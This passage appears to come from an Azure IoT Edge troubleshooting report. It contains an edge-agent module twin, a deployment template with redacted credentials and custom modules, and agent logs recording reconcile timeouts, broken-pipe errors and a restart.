              "$lastUpdatedBy": "v20191127_2_release_436",
              "$lastUpdatedByDigest": "637105260216639817"
            },
            "settings": {
              "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
              "$lastUpdatedVersion": 14,
              "image": {
                "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
                "$lastUpdatedVersion": 14,
                "$lastUpdatedBy": "v20191127_2_release_436",
                "$lastUpdatedByDigest": "637105260216639817"
              },
              "createOptions": {
                "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
                "$lastUpdatedVersion": 14,
                "$lastUpdatedBy": "v20191127_2_release_436",
                "$lastUpdatedByDigest": "637105260216639817"
              }
            }
          },
          "EdgeLoggingSpout": {
            "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
            "$lastUpdatedVersion": 14,
            "version": {
              "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
              "$lastUpdatedVersion": 14,
              "$lastUpdatedBy": "v20191127_2_release_436",
              "$lastUpdatedByDigest": "637105260216639817"
            },
            "type": {
              "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
              "$lastUpdatedVersion": 14,
              "$lastUpdatedBy": "v20191127_2_release_436",
              "$lastUpdatedByDigest": "637105260216639817"
            },
            "status": {
              "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
              "$lastUpdatedVersion": 14,
              "$lastUpdatedBy": "v20191127_2_release_436",
              "$lastUpdatedByDigest": "637105260216639817"
            },
            "restartPolicy": {
              "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
              "$lastUpdatedVersion": 14,
              "$lastUpdatedBy": "v20191127_2_release_436",
              "$lastUpdatedByDigest": "637105260216639817"
            },
            "settings": {
              "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
              "$lastUpdatedVersion": 14,
              "image": {
                "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
                "$lastUpdatedVersion": 14,
                "$lastUpdatedBy": "v20191127_2_release_436",
                "$lastUpdatedByDigest": "637105260216639817"
              },
              "createOptions": {
                "$lastUpdated": "2019-11-28T08:25:56.4003027Z",
                "$lastUpdatedVersion": 14,
                "$lastUpdatedBy": "v20191127_2_release_436",
                "$lastUpdatedByDigest": "637105260216639817"
              }
            }
          }
        }
      },
      "$version": 14
    },
    "reported": {
      "schemaVersion": "1.0",
      "version": {
        "version": "1.0.8.4",
        "build": "26769994",
        "commit": "7f452949464b45ed67f1cdcc5755654d211674ab"
      },
      "lastDesiredVersion": 14,
      "lastDesiredStatus": {
        "code": 500,
        "description": "A task was canceled."
      },
      "runtime": {
        "platform": {
          "os": "linux",
          "architecture": "armv7l",
          "version": "1.0.8 (208b2204fd30e856d00b280112422130c104b9f0)"
        },
        "type": "docker",
        "settings": {
          "minDockerVersion": "v1.25",
          "loggingOptions": "",
          "registryCredentials": {
            "REMOVED BEFORE UPLOAD": { }
          }
        }
      },
      "systemModules": {
        "edgeAgent": {
          "type": "Unknown"
        },
        "edgeHub": {
          "type": "Unknown",
          "status": "unknown",
          "restartPolicy": "never",
          "env": {}
        }
      },
      "modules": {},
      "$metadata": {
        "$lastUpdated": "2019-11-28T19:47:39.1649938Z",
        "schemaVersion": {
          "$lastUpdated": "2019-11-25T07:47:52.273454Z"
        },
        "version": {
          "$lastUpdated": "2019-11-28T12:45:24.7868915Z",
          "version": {
            "$lastUpdated": "2019-11-28T12:45:24.7868915Z"
          },
          "build": {
            "$lastUpdated": "2019-11-28T12:45:24.7868915Z"
          },
          "commit": {
            "$lastUpdated": "2019-11-28T12:45:24.7868915Z"
          }
        },
        "lastDesiredVersion": {
          "$lastUpdated": "2019-11-28T12:45:24.7868915Z"
        },
        "lastDesiredStatus": {
          "$lastUpdated": "2019-11-28T19:47:39.1649938Z",
          "code": {
            "$lastUpdated": "2019-11-28T19:47:39.1649938Z"
          },
          "description": {
            "$lastUpdated": "2019-11-28T19:47:39.1649938Z"
          }
        },
        "runtime": {
          "$lastUpdated": "2019-11-25T07:47:52.273454Z",
          "platform": {
            "$lastUpdated": "2019-11-25T07:47:52.273454Z",
            "os": {
              "$lastUpdated": "2019-11-25T07:47:52.273454Z"
            },
            "architecture": {
              "$lastUpdated": "2019-11-25T07:47:52.273454Z"
            },
            "version": {
              "$lastUpdated": "2019-11-25T07:47:52.273454Z"
            }
          },
          "type": {
            "$lastUpdated": "2019-11-25T07:47:52.273454Z"
          },
          "settings": {
            "$lastUpdated": "2019-11-25T07:47:52.273454Z",
            "minDockerVersion": {
              "$lastUpdated": "2019-11-25T07:47:52.273454Z"
            },
            "loggingOptions": {
              "$lastUpdated": "2019-11-25T07:47:52.273454Z"
            },
            "registryCredentials": { "REMOVED BEFORE UPLOAD: "" }
          }
        },
        "systemModules": {
          "$lastUpdated": "2019-11-28T19:47:39.1649938Z",
          "edgeAgent": {
            "$lastUpdated": "2019-11-28T19:47:39.1649938Z",
            "type": {
              "$lastUpdated": "2019-11-28T19:47:39.1649938Z"
            }
          },
          "edgeHub": {
            "$lastUpdated": "2019-11-28T19:47:39.1649938Z",
            "type": {
              "$lastUpdated": "2019-11-28T19:47:39.1649938Z"
            },
            "status": {
              "$lastUpdated": "2019-11-28T19:47:39.1649938Z"
            },
            "restartPolicy": {
              "$lastUpdated": "2019-11-28T19:47:39.1649938Z"
            },
            "env": {
              "$lastUpdated": "2019-11-28T19:47:39.1649938Z"
            }
          }
        },
        "modules": {
          "$lastUpdated": "2019-11-28T19:47:39.1649938Z"
        }
      },
      "$version": 33
    }
  },
  "configurations": {
    "v20191030_2_release_373": {
      "status": "Targeted"
    },
    "v20191104_9_release_389": {
      "status": "Targeted"
    },
    "v20191106_1_release_390": {
      "status": "Targeted"
    },
    "v20191106_2_release_393": {
      "status": "Targeted"
    },
    "v20191106_3_release_395": {
      "status": "Targeted"
    },
    "v20191112_9_release_405": {
      "status": "Targeted"
    },
    "v20191126_3_release_431": {
      "status": "Targeted"
    },
    "v20191127_1_release_434": {
      "status": "Targeted"
    },
    "v20191127_2_release_436": {
      "status": "Applied"
    }
  }
}

```
</details>

<details>
<summary>deployment template</summary>

```

{
  "$schema-template": "1.0.1",
  "modulesContent": {
    "$edgeAgent": {
      "properties.desired": {
        "schemaVersion": "1.0",
        "runtime": {
          "type": "docker",
          "settings": {
            "minDockerVersion": "v1.25",
            "loggingOptions": "",
            "registryCredentials": {
              "$REGISTRY_USERNAME": {
                "username": "$REGISTRY_USERNAME",
                "password": "$REGISTRY_PASSWORD",
                "address": "$REGISTRY_ADDRESS"
              }
            }
          }
        },
        "systemModules": {
          "edgeAgent": {
            "type": "docker",
            "settings": {
              "image": "mcr.microsoft.com/azureiotedge-agent:1.0.8.4",
              "createOptions": {}
            }
          },
          "edgeHub": {
            "type": "docker",
            "status": "running",
            "restartPolicy": "always",
            "settings": {
              "image": "mcr.microsoft.com/azureiotedge-hub:1.0.8.4",
              "createOptions": {
                "HostConfig": {
                  "PortBindings": {
                    "5671/tcp": [
                      {
                        "HostPort": "5671"
                      }
                    ],
                    "8883/tcp": [
                      {
                        "HostPort": "8883"
                      }
                    ],
                    "443/tcp": [
                      {
                        "HostPort": "443"
                      }
                    ]
                  }
                }
              }
            },
            "env": {
              "OptimizeForPerformance": {
                "value": "false"
              }
            }
          }
        },
        "modules": {
          "CUSTOM MODULE 1": {
            "version": "1.0.0",
            "type": "docker",
            "status": "running",
            "restartPolicy": "always",
            "settings": {
              "image": "REMOVED BEFORE UPLOAD",
              "createOptions": {
                "HostConfig": {
                  "NetworkMode": "host"
                },
                "NetworkingConfig": {
                  "EndpointsConfig": {
                    "host": {}
                  }
                }
              }
            }
          },
          "CUSTOM MODULE 2": {
            "version": "1.0.0",
            "type": "docker",
            "status": "running",
            "restartPolicy": "always",
            "settings": {
              "image": "REMOVED BEFORE UPLOAD",
              "createOptions": {
                "HostConfig": {
                  "Mounts": [
                    {
                      "Type": "bind",
                      "Target": "REMOVED BEFORE UPLOAD",
                      "Source": "REMOVED BEFORE UPLOAD"
                    }
                  ]
                }
              }
            }
          },
          "CUSTOM MODULE 3": {
            "version": "1.0.0",
            "type": "docker",
            "status": "running",
            "restartPolicy": "always",
            "settings": {
              "image": "REMOVED BEFORE UPLOAD",
              "createOptions": {
                "HostConfig": {
                  "Mounts": [
                    {
                      "Type": "bind",
                      "Target": "REMOVED BEFORE UPLOAD",
                      "Source": "REMOVED BEFORE UPLOAD"
                    }
                  ]
                }
              }
            }
          },
          "EdgeLoggingSpout": {
            "version": "1.0.0",
            "type": "docker",
            "status": "running",
            "restartPolicy": "always",
            "settings": {
              "image": "veyalla/logspout-loganalytics:linux-arm32v7",
              "createOptions": {
                "Env": [
                  "BACKLOG=false",
                  "LOGSPOUT=ignore",
                  "LOGANALYTICS_WORKSPACE_ID=REMOVED BEFORE UPLOAD",
                  "LOGANALYTICS_WORKSPACE_SECRET=REMOVED BEFORE UPLOAD"
                ],
                "Cmd": [
                  "loganalytics://"
                ],
                "HostConfig": {
                  "Binds": [
                    "/var/run/docker.sock:/var/run/docker.sock"
                  ]
                }
              }
            }
          }
        }
      }
    },
    "$edgeHub": {
      "properties.desired": {
        "schemaVersion": "1.0",
        "routes": {
          "ROUTE 1": "FROM /messages/modules/CUSTOM MODULE 1/outputs/* INTO BrokeredEndpoint(\"/modules/CUSTOM MODULE 2/inputs/*\")",
          "ROUTE 2": "FROM /messages/modules/CUSTOM MODULE 1/outputs/* INTO BrokeredEndpoint(\"/modules/CUSTOM MODULE 3/inputs/*\")",
          "ROUTE 3": "FROM /messages/modules/CUSTOM MODULE 2/outputs/* INTO $upstream"
        },
        "storeAndForwardConfiguration": {
          "timeToLiveSecs": 7200
        }
      }
    }
  }
}

```
</details>

<details>
<summary>second observation: edge-agent logs</summary>

```
<6> 2019-12-03 08:31:00.321 +00:00 [INF] - Successfully completed periodic operation refresh twin config
<6> 2019-12-03 09:30:09.721 +00:00 [INF] - Starting compaction of stores
<6> 2019-12-03 09:30:09.722 +00:00 [INF] - Starting compaction of store moduleState
<6> 2019-12-03 09:30:09.733 +00:00 [INF] - Starting compaction of store deploymentConfig
<6> 2019-12-03 09:30:09.733 +00:00 [INF] - Starting compaction of store default
<6> 2019-12-03 09:31:00.328 +00:00 [INF] - Starting periodic operation refresh twin config...
<6> 2019-12-03 09:31:00.370 +00:00 [INF] - Obtained Edge agent twin from IoTHub with desired properties version 14 and reported properties version 77.
<6> 2019-12-03 09:31:00.381 +00:00 [INF] - Successfully completed periodic operation refresh twin config
<6> 2019-12-03 10:31:00.378 +00:00 [INF] - Starting periodic operation refresh twin config...
<6> 2019-12-03 10:31:00.417 +00:00 [INF] - Obtained Edge agent twin from IoTHub with desired properties version 14 and reported properties version 77.
<6> 2019-12-03 10:31:00.428 +00:00 [INF] - Successfully completed periodic operation refresh twin config
<6> 2019-12-03 11:30:09.723 +00:00 [INF] - Starting compaction of stores
<6> 2019-12-03 11:30:09.723 +00:00 [INF] - Starting compaction of store moduleState
<6> 2019-12-03 11:30:09.724 +00:00 [INF] - Starting compaction of store deploymentConfig
<6> 2019-12-03 11:30:09.725 +00:00 [INF] - Starting compaction of store default
<6> 2019-12-03 11:31:00.441 +00:00 [INF] - Starting periodic operation refresh twin config...
<6> 2019-12-03 11:31:00.480 +00:00 [INF] - Obtained Edge agent twin from IoTHub with desired properties version 14 and reported properties version 77.
<6> 2019-12-03 11:31:00.491 +00:00 [INF] - Successfully completed periodic operation refresh twin config
<6> 2019-12-03 12:31:00.498 +00:00 [INF] - Starting periodic operation refresh twin config...
<6> 2019-12-03 12:31:00.585 +00:00 [INF] - Obtained Edge agent twin from IoTHub with desired properties version 14 and reported properties version 77.
<6> 2019-12-03 12:31:00.610 +00:00 [INF] - Successfully completed periodic operation refresh twin config
<6> 2019-12-03 13:30:09.718 +00:00 [INF] - Starting compaction of stores
<6> 2019-12-03 13:30:09.718 +00:00 [INF] - Starting compaction of store moduleState
<6> 2019-12-03 13:30:09.812 +00:00 [INF] - Starting compaction of store deploymentConfig
<6> 2019-12-03 13:30:09.813 +00:00 [INF] - Starting compaction of store default
<6> 2019-12-03 13:31:00.610 +00:00 [INF] - Starting periodic operation refresh twin config...
<6> 2019-12-03 13:31:00.684 +00:00 [INF] - Obtained Edge agent twin from IoTHub with desired properties version 14 and reported properties version 77.
<6> 2019-12-03 13:31:00.708 +00:00 [INF] - Successfully completed periodic operation refresh twin config
<6> 2019-12-03 14:31:04.636 +00:00 [INF] - Starting periodic operation refresh twin config...
<6> 2019-12-03 14:32:05.962 +00:00 [INF] - Obtained Edge agent twin from IoTHub with desired properties version 14 and reported properties version 77.
<6> 2019-12-03 14:32:44.308 +00:00 [INF] - Successfully completed periodic operation refresh twin config
<4> 2019-12-03 14:36:48.768 +00:00 [WRN] - Reconcile failed because of the an exception
System.TimeoutException: Operation timed out
   at Microsoft.Azure.Devices.Edge.Util.TaskEx.TimeoutAfter[T](Task`1 task, TimeSpan timeout) in /home/vsts/work/1/s/edge-util/src/Microsoft.Azure.Devices.Edge.Util/TaskEx.cs:line 121
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Versioning.ModuleManagementHttpClientVersioned.Execute[T](Func`1 func, String operation)
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Version_2019_01_30.ModuleManagementHttpClient.HandleException(Exception exception, String operation) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Edgelet/version_2019_01_30/ModuleManagementHttpClient.cs:line 203
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Versioning.ModuleManagementHttpClientVersioned.Execute[T](Func`1 func, String operation) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Edgelet/versioning/ModuleManagementHttpClientVersioned.cs:line 123
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Version_2019_01_30.ModuleManagementHttpClient.GetModules[T](CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Edgelet/version_2019_01_30/ModuleManagementHttpClient.cs:line 137
   at Microsoft.Azure.Devices.Edge.Agent.Docker.DockerEnvironment.GetModulesAsync(CancellationToken token) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Docker/DockerEnvironment.cs:line 50
   at Microsoft.Azure.Devices.Edge.Agent.Core.Agent.GetCurrentModuleSetAsync(CancellationToken token) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Core/Agent.cs:line 227
   at Microsoft.Azure.Devices.Edge.Agent.Core.Agent.ReconcileAsync(CancellationToken token) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Core/Agent.cs:line 149
<4> 2019-12-03 14:41:12.828 +00:00 [WRN] - Agent reconcile concluded with errors.
System.TimeoutException: Operation timed out
   at Microsoft.Azure.Devices.Edge.Util.TaskEx.TimeoutAfter(Task task, TimeSpan timeout) in /home/vsts/work/1/s/edge-util/src/Microsoft.Azure.Devices.Edge.Util/TaskEx.cs:line 137
   at Microsoft.Azure.Devices.Edge.Agent.Service.Program.MainAsync(IConfiguration configuration) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Service/Program.cs:line 196
<4> 2019-12-03 14:52:25.574 +00:00 [WRN] - Agent reconcile concluded with errors.
System.TimeoutException: Operation timed out
   at Microsoft.Azure.Devices.Edge.Util.TaskEx.TimeoutAfter(Task task, TimeSpan timeout) in /home/vsts/work/1/s/edge-util/src/Microsoft.Azure.Devices.Edge.Util/TaskEx.cs:line 137
 
Microsoft.Azure.Devices.Edge.Agent.Service.Program.MainAsync(IConfiguration configuration) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Service/Program.cs:line 196
<4> 2019-12-03 15:03:36.365 +00:00 [WRN] - Agent reconcile concluded with errors.
System.TimeoutException: Operation timed out
   at Microsoft.Azure.Devices.Edge.Util.TaskEx.TimeoutAfter(Task task, TimeSpan timeout) in /home/vsts/work/1/s/edge-util/src/Microsoft.Azure.Devices.Edge.Util/TaskEx.cs:line 137
   at Microsoft.Azure.Devices.Edge.Agent.Service.Program.MainAsync(IConfiguration configuration) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Service/Program.cs:line 196
<4> 2019-12-03 15:16:04.689 +00:00 [WRN] - Agent reconcile concluded with errors.
System.TimeoutException: Operation timed out
   at Microsoft.Azure.Devices.Edge.Util.TaskEx.TimeoutAfter(Task task, TimeSpan timeout) in /home/vsts/work/1/s/edge-util/src/Microsoft.Azure.Devices.Edge.Util/TaskEx.cs:line 137
   at Microsoft.Azure.Devices.Edge.Agent.Service.Program.MainAsync(IConfiguration configuration) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Service/Program.cs:line 196
<4> 2019-12-03 15:19:10.005 +00:00 [WRN] - Updating reported properties failed with error The operation did not complete within the allocated time 00:01:00 for object message. type Microsoft.Azure.Devices.Client.Exceptions.IotHubCommunicationException
<4> 2019-12-03 15:19:10.632 +00:00 [WRN] - Reconcile failed because of the an exception
System.IO.IOException: Unable to read data from the transport connection: Broken pipe. ---> System.Net.Sockets.SocketException: Broken pipe
   --- End of inner exception stack trace ---
   at System.IO.BufferedStream.FlushWriteAsync(CancellationToken cancellationToken)
   at System.IO.BufferedStream.ReadFromUnderlyingStreamAsync(Memory`1 buffer, CancellationToken cancellationToken, Int32 bytesAlreadySatisfied, Task semaphoreLockTask)
   at Microsoft.Azure.Devices.Edge.Util.Uds.HttpBufferedStream.ReadLineAsync(CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-util/src/Microsoft.Azure.Devices.Edge.Util/uds/HttpBufferedStream.cs:line 62
   at Microsoft.Azure.Devices.Edge.Util.Uds.HttpRequestResponseSerializer.SetResponseStatusLine(HttpResponseMessage httpResponse, HttpBufferedStream bufferedStream, CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-util/src/Microsoft.Azure.Devices.Edge.Util/uds/HttpRequestResponseSerializer.cs:line 131
   at Microsoft.Azure.Devices.Edge.Util.Uds.HttpRequestResponseSerializer.DeserializeResponse(HttpBufferedStream bufferedStream, CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-util/src/Microsoft.Azure.Devices.Edge.Util/uds/HttpRequestResponseSerializer.cs:line 65
   at Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler.SendAsync(HttpRequestMessage request, CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-util/src/Microsoft.Azure.Devices.Edge.Util/uds/HttpUdsMessageHandler.cs:line 36
   at System.Net.Http.HttpClient.FinishSendAsyncUnbuffered(Task`1 sendTask, HttpRequestMessage request, CancellationTokenSource cts, Boolean disposeCts)
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Version_2019_01_30.GeneratedCode.EdgeletHttpClient.ListModulesAsync(String api_version, CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Edgelet/version_2019_01_30/generatedCode/EdgeletHttpClient.cs:line 80
   at Microsoft.Azure.Devices.Edge.Util.TaskEx.TimeoutAfter[T](Task`1 task, TimeSpan timeout)
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Versioning.ModuleManagementHttpClientVersioned.Execute[T](Func`1 func, String operation)
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Version_2019_01_30.ModuleManagementHttpClient.HandleException(Exception exception, String operation) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Edgelet/version_2019_01_30/ModuleManagementHttpClient.cs:line 203
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Versioning.ModuleManagementHttpClientVersioned.Execute[T](Func`1 func, String operation) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Edgelet/versioning/ModuleManagementHttpClientVersioned.cs:line 123
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Version_2019_01_30.ModuleManagementHttpClient.GetModules[T](CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Edgelet/version_2019_01_30/ModuleManagementHttpClient.cs:line 137
   at Microsoft.Azure.Devices.Edge.Agent.Docker.DockerEnvironment.GetModulesAsync(CancellationToken token) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Docker/DockerEnvironment.cs:line 50
   at Microsoft.Azure.Devices.Edge.Agent.Core.Agent.GetCurrentModuleSetAsync(CancellationToken token) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Core/Agent.cs:line 227
   at Microsoft.Azure.Devices.Edge.Agent.Core.Agent.ReconcileAsync(CancellationToken token) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Core/Agent.cs:line 149
<6> 2019-12-03 15:19:11.654 +00:00 [INF] - Termination requested, initiating shutdown.
<4> 2019-12-03 15:19:11.685 +00:00 [WRN] - Agent reconcile concluded with errors.
System.Threading.Tasks.TaskCanceledException: A task was canceled.
   at Microsoft.Azure.Devices.Edge.Agent.Core.Agent.ReconcileAsync(CancellationToken token) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Core/Agent.cs:line 108
   at Microsoft.Azure.Devices.Edge.Util.TaskEx.TimeoutAfter(Task task, TimeSpan timeout) in /home/vsts/work/1/s/edge-util/src/Microsoft.Azure.Devices.Edge.Util/TaskEx.cs:line 141
   at Microsoft.Azure.Devices.Edge.Agent.Service.Program.MainAsync(IConfiguration configuration) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Service/Program.cs:line 196
<6> 2019-12-03 15:19:11.720 +00:00 [INF] - Main thread terminated
<6> 2019-12-03 15:19:11.789 +00:00 [INF] - Initiating shutdown cleanup.
<6> 2019-12-03 15:19:11.833 +00:00 [INF] - Stopping all modules...
<4> 2019-12-03 15:19:11.894 +00:00 [WRN] - Error while stopping all modules.
System.IO.IOException: Unable to read data from the transport connection: Broken pipe. ---> System.Net.Sockets.SocketException: Broken pipe
   --- End of inner exception stack trace ---
   at System.IO.BufferedStream.FlushWriteAsync(CancellationToken cancellationToken)
   at System.IO.BufferedStream.ReadFromUnderlyingStreamAsync(Memory`1 buffer, CancellationToken cancellationToken, Int32 bytesAlreadySatisfied, Task semaphoreLockTask)
   at Microsoft.Azure.Devices.Edge.Util.Uds.HttpBufferedStream.ReadLineAsync(CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-util/src/Microsoft.Azure.Devices.Edge.Util/uds/HttpBufferedStream.cs:line 62
   at Microsoft.Azure.Devices.Edge.Util.Uds.HttpRequestResponseSerializer.SetResponseStatusLine(HttpResponseMessage httpResponse, HttpBufferedStream bufferedStream, CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-util/src/Microsoft.Azure.Devices.Edge.Util/uds/HttpRequestResponseSerializer.cs:line 131
   at Microsoft.Azure.Devices.Edge.Util.Uds.HttpRequestResponseSerializer.DeserializeResponse(HttpBufferedStream bufferedStream, CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-util/src/Microsoft.Azure.Devices.Edge.Util/uds/HttpRequestResponseSerializer.cs:line 65
   at Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler.SendAsync(HttpRequestMessage request, CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-util/src/Microsoft.Azure.Devices.Edge.Util/uds/HttpUdsMessageHandler.cs:line 36
   at System.Net.Http.HttpClient.FinishSendAsyncUnbuffered(Task`1 sendTask, HttpRequestMessage request, CancellationTokenSource cts, Boolean disposeCts)
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Version_2019_01_30.GeneratedCode.EdgeletHttpClient.ListModulesAsync(String api_version, CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Edgelet/version_2019_01_30/generatedCode/EdgeletHttpClient.cs:line 80
   at Microsoft.Azure.Devices.Edge.Util.TaskEx.TimeoutAfter[T](Task`1 task, TimeSpan timeout)
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Versioning.ModuleManagementHttpClientVersioned.Execute[T](Func`1 func, String operation)
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Version_2019_01_30.ModuleManagementHttpClient.HandleException(Exception exception, String operation) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Edgelet/version_2019_01_30/ModuleManagementHttpClient.cs:line 203
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Versioning.ModuleManagementHttpClientVersioned.Execute[T](Func`1 func, String operation) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Edgelet/versioning/ModuleManagementHttpClientVersioned.cs:line 123
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Version_2019_01_30.ModuleManagementHttpClient.GetModules[T](CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Edgelet/version_2019_01_30/ModuleManagementHttpClient.cs:line 137
   at Microsoft.Azure.Devices.Edge.Agent.Docker.DockerEnvironment.GetModulesAsync(CancellationToken token) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Docker/DockerEnvironment.cs:line 50
   at Microsoft.Azure.Devices.Edge.Agent.Core.Agent.GetCurrentModuleSetAsync(CancellationToken token) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Core/Agent.cs:line 227
   at Microsoft.Azure.Devices.Edge.Agent.Core.Agent.ShutdownModules(CancellationToken token) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Core/Agent.cs:line 307
<6> 2019-12-03 15:19:11.981 +00:00 [INF] - Waiting for cleanup to finish
2019-12-03 15:19:44 +00:00 Starting Edge Agent
2019-12-03 15:19:46.091 +00:00 Edge Agent Main()
<6> 2019-12-03 15:19:47.935 +00:00 [INF] - Initializing Edge Agent.
<6> 2019-12-03 15:19:49.367 +00:00 [INF] - Version - 1.0.8.4.26769994 (7f452949464b45ed67f1cdcc5755654d211674ab)
<6> 2019-12-03 15:19:49.369 +00:00 [INF] -
        █████╗ ███████╗██╗   ██╗██████╗ ███████╗
       ██╔══██╗╚══███╔╝██║   ██║██╔══██╗██╔════╝
       ███████║  ███╔╝ ██║   ██║██████╔╝█████╗
       ██╔══██║ ███╔╝  ██║   ██║██╔══██╗██╔══╝
       ██║  ██║███████╗╚██████╔╝██║  ██║███████╗
       ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝

 ██╗ ██████╗ ████████╗    ███████╗██████╗  ██████╗ ███████╗
 ██║██╔═══██╗╚══██╔══╝    ██╔════╝██╔══██╗██╔════╝ ██╔════╝
 ██║██║   ██║   ██║       █████╗  ██║  ██║██║  ███╗█████╗
 ██║██║   ██║   ██║       ██╔══╝  ██║  ██║██║   ██║██╔══╝
 ██║╚██████╔╝   ██║       ███████╗██████╔╝╚██████╔╝███████╗
 ╚═╝ ╚═════╝    ╚═╝       ╚══════╝╚═════╝  ╚═════╝ ╚══════╝

<6> 2019-12-03 15:19:49.777 +00:00 [INF] - Experimental features configuration: {"Enabled":false,"DisableCloudSubscriptions":false,"EnableUploadLogs":false}
<6> 2019-12-03 15:19:52.437 +00:00 [INF] - Started operation refresh twin config
<6> 2019-12-03 15:19:52.616 +00:00 [INF] - Edge agent attempting to connect to IoT Hub via Amqp_Tcp_Only...
<6> 2019-12-03 15:19:55.382 +00:00 [INF] - Created persistent store at /tmp/edgeAgent
<6> 2019-12-03 15:20:10.334 +00:00 [INF] - Edge agent connected to IoT Hub via Amqp_Tcp_Only.
<6> 2019-12-03 15:20:10.960 +00:00 [INF] - Initialized new module client with subscriptions enabled
<6> 2019-12-03 15:20:11.353 +00:00 [INF] - Obtained Edge agent twin from IoTHub with desired properties version 16 and reported properties version 77.
<6> 2019-12-03 15:20:13.933 +00:00 [INF] - Plan execution started for deployment 16
<6> 2019-12-03 15:20:13.964 +00:00 [INF] - Executing command: "Saving REMOVED BEFORE UPLOAD to store"
<6> 2019-12-03 15:20:14.027 +00:00 [INF] - Executing command: "Saving REMOVED BEFORE UPLOAD to store"
<6> 2019-12-03 15:20:14.057 +00:00 [INF] - Executing command: "Saving REMOVED BEFORE UPLOAD to store"
<6> 2019-12-03 15:20:14.176 +00:00 [INF] - Executing command: "Command Group: (\n  [Create module MqttBroker]\n  [Start module MqttBroker]\n)"
<6> 2019-12-03 15:20:14.187 +00:00 [INF] - Executing command: "Create module MqttBroker"
<6> 2019-12-03 15:20:22.574 +00:00 [INF] - Executing command: "Start module MqttBroker"
<6> 2019-12-03 15:20:25.911 +00:00 [INF] - Executing command: "Command Group: (\n  [Command Group: (\n  [Prepare update module REMOVED BEFORE UPLOAD]\n  [Stop module REMOVED BEFORE UPLOAD]\n  [Update module REMOVED BEFORE UPLOAD]\n)]\n  [Start module REMOVED BEFORE UPLOAD]\n)"
<6> 2019-12-03 15:20:25.912 +00:00 [INF] - Executing command: "Command Group: (\n  [Prepare update module REMOVED BEFORE UPLOAD]\n  [Stop module REMOVED BEFORE UPLOAD]\n  [Update module REMOVED BEFORE UPLOAD]\n)"
<6> 2019-12-03 15:20:37.360 +00:00 [INF] - Executing command: "Start module REMOVED BEFORE UPLOAD"
